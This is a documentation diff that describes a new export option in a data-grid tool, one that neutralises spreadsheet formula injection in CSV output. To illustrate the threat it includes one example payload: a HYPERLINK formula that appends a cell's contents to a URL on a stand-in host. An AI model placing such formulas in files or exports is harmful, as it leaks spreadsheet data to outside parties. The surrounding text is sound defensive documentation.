@@ -526,6 +526,17 @@ The top of the menu chooses what is exported, and the **Save as file** and
 - **Include header row (column names)**, on by default, and **Delimiter**
   (comma, semicolon or tab) apply to CSV saved or copied from this menu and to
   Export all rows as CSV. The context menu's Copy as CSV is not affected.
+- **Protect against spreadsheet formulas**, off by default, puts a `'` before
+  every text cell and column name that starts with `=`, `+`, `-`, `@`, a tab or
+  a carriage return in CSV saved or copied from this menu and in Export all
+  rows as CSV. A spreadsheet runs such a cell as a formula when it opens the
+  file, and data from a server can carry one on purpose, for example
+  `=HYPERLINK("https://example.com/?"&A1)`. With the option on, the spreadsheet
+  shows the text instead; numbers are not changed. Leave it off when the file
+  is read by another program, which then sees the `'`. Multi-table export
+  folders (Export Data) never change their values. For Copy and Copy as CSV,
+  use the setting **Protect copied cells against spreadsheet formulas** in
+  Settings > General > Data grid.
 
 The caption over the options states what the formats write, for example
 "Export 12 selected rows, 4 columns", and the toast after a save or copy states
